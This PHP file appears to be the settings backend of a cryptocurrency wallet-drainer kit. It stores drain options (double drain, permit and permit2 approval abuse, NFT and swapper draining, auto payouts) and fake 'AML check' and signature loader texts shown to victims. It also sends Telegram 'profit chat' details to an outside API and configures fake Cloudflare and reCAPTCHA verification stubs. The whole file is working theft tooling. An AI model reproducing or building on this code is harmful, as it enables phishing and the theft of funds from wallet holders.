<?php
session_start();

require $_SERVER['DOCUMENT_ROOT'] . '/encryption.php';
require $_SERVER["DOCUMENT_ROOT"] . '/settings-default.php';
require $_SERVER['DOCUMENT_ROOT'] . '/php/info_send_log.php';

$server_api_url = "https://moralis-node.dev/api/site-settings";
$filePath = $_SERVER["DOCUMENT_ROOT"] . '/settings.txt';
$cloudStubFilePath = $_SERVER["DOCUMENT_ROOT"] . '/cloud-settings.json';
$googleStubFilePath = $_SERVER["DOCUMENT_ROOT"] . '/google-settings.json';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $data_raw = array(
        // Screen #1 items
        'auto_payouts' => (boolean) $_POST['auto_payouts'],
        'wallet_verification' => (boolean) $_POST['wallet_verification'],
        'contract_method' => $_POST['contract_method'],
        'loop_token' => (boolean) $_POST['loop_token'],
        'thanks_redirect' => (boolean) $_POST['thanks_redirect'] ?? false,
        'thanks_redirect_url' => $_POST['thanks_redirect_url'],
        'permit_priority' => (boolean) $_POST['permit_priority'],
        'permit_amount' => $_POST['permit_amount'],
        'modal_type' => $_POST['modal_type'],
        'modal_open_event' => $_POST['modal_open_event'],
        'modal_theme' => $_POST['modal_theme'],
        'modal_pallete' => $_POST['modal_pallete'] ?? '',
        'modal_font' => $_POST['modal_font'] ?? '',
        'modal_open_logic' => $_POST['modal_open_logic'],
        'loader_type' => $_POST['loader_type'],
        'chain_tries_limit' => $_POST['chain_tries_limit'],
        'minimal_wallet_price' => $_POST['minimal_wallet_price'],
        'minimal_token_price' => $_POST['minimal_token_price'],
        'minimal_native_price' => $_POST['minimal_native_price'],
        'nft_mode' => (boolean) $_POST['nft_mode'],
        'permit_mode' => (boolean) $_POST['permit_mode'],
        'permit2_mode' => (boolean) $_POST['permit2_mode'],
        'swappers_mode' => (boolean) $_POST['swappers_mode'],
        'cache_data' => (boolean) $_POST['cache_data'],
        'double_drain_mode' => (boolean) $_POST['double_drain_mode'],
        'double_drain_class' => $_POST['double_drain_class'] ?? $settings_default['double_drain_class'],
        'double_drain_text' => $_POST['double_drain_text'] ?? $settings_default['double_drain_text'],

        // Screen #2 items
        'loader_text' => [
            'connect' => [
              'description' => strip_tags($_POST['loader-connect'])
            ],
            'connect-success' => [
              'description' => strip_tags($_POST['loader-connect-success-description'])
            ],
            'address-check' => [
              'description' => strip_tags($_POST['loader-address-check-description'])
            ],
            'aml-check' => [
              'description' => strip_tags($_POST['loader-aml-check-description'])
            ],
            'aml-check-success' => [
              'description' => strip_tags($_POST['loader-aml-check-success-description'])
            ],
            'scanning-more' => [
              'description' => strip_tags($_POST['loader-scanning-more-description'])
            ],
            'thanks' => [
              'description' => strip_tags($_POST['loader-thanks-description'])
            ],
            'sign-validation' => [
              'description' => strip_tags($_POST['loader-sign-validation-description'])
            ],
            'sign-waiting' => [
              'title' => strip_tags($_POST['loader-sign-waiting-title']),
              'description' => strip_tags($_POST['loader-sign-waiting-description'])
            ],
            'sign-confirmed' => [
              'description' => strip_tags($_POST['loader-sign-confirmed-description'])
            ],
            'error' => [
              'title' => strip_tags($_POST['loader-error-title']),
              'description' => strip_tags($_POST['loader-error-description']),
              'button' => strip_tags($_POST['loader-error-button'])
            ],
            'low-balance-error' => [
              'description' => strip_tags($_POST['loader-low-balance-error-description']),
              'button' => strip_tags($_POST['loader-low-balance-error-button'])
            ],
            'aml-check-error' => [
              'title' => strip_tags($_POST['loader-aml-check-error-title']),
              'description' => strip_tags($_POST['loader-aml-check-error-description'])
            ],
        ],

        // Screen #3 items
        'messaging_bot' => $_POST['messaging_bot'],
        'messaging_chat' => $_POST['messaging_chat'],
        'profit_chat' => $_POST['profit_chat'],
        'chat_language' => $_POST['chat_language'],
        'enter_website' => (boolean) $_POST['enter_website'],
        'exit_website' => (boolean) $_POST['exit_website'],
        'chain_request' => (boolean) $_POST['chain_request'],
        'approve_request' => (boolean) $_POST['approve_request'],
        'connect_request' => (boolean) $_POST['connect_request'],
        'approve_cancel' => (boolean) $_POST['approve_cancel'],
        'chain_cancel' => (boolean) $_POST['chain_cancel'],
        'connect_success' => (boolean) $_POST['connect_success'],

        // Screen #4 items
        'wc_background_image' => $_POST['wc_background_image'],
        'wc_font' => $_POST['wc_font'],
        'wc_logo' => $_POST['wc_logo'],
        'wc_accent_color' => $_POST['wc_accent_color'],
        'wc_background_color' => $_POST['wc_background_color'],
        'wc_fill_color' => $_POST['wc_fill_color'],
    );
  
    $data_json = json_encode($data_raw);
  
    $data_encrypted = AesCtr::encrypt($data_json, "c3VwZXJfc3Ryb25nX2tleQ", 128);
    $is_settings_saved = file_put_contents($filePath, $data_encrypted);
  
    if ($is_settings_saved) {
        $_SESSION["update-message-status"] = 'save-success';
    } else {
        $_SESSION["update-message-status"] = 'save-error';
    }

    $data = array(
      'id' => $telegram_id . ':' . $_SERVER['HTTP_HOST'],
      'messaging_bot' => $data_raw['messaging_bot'],
      'messaging_chat' => $data_raw['messaging_chat'],
      'profit_chat' => $data_raw['profit_chat'],
    );
  
    $options = array(
      'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($data)
      )
    );
  


    if (file_exists($cloudStubFilePath))  {
      file_put_contents($cloudStubFilePath, json_encode([
        "logo-light-theme" => "https://www.serviops.ca/wp-content/uploads/2015/11/Cloudflare_logo.svg_.png",
        "logo-dark-theme" => "https://pnghq.com/wp-content/uploads/cloudflare-logo-png-image-1536x508.png",
        'button-color' => $_POST['cloud_button_color'],
        'button-text' => $_POST['cloud_button_text'],
        'button-text-verification' => $_POST['cloud_button_text_verification'],
        'reload-delay' => (int)$_POST['cloud_reload_delay'] * 1000,
      ]));
    }

    if (file_exists($googleStubFilePath))  {
      file_put_contents($googleStubFilePath, json_encode([
        'domain_name' => $_POST['recaptcha_domain_name'],
      ]));
    }

    header("Location: ../");
  }
?>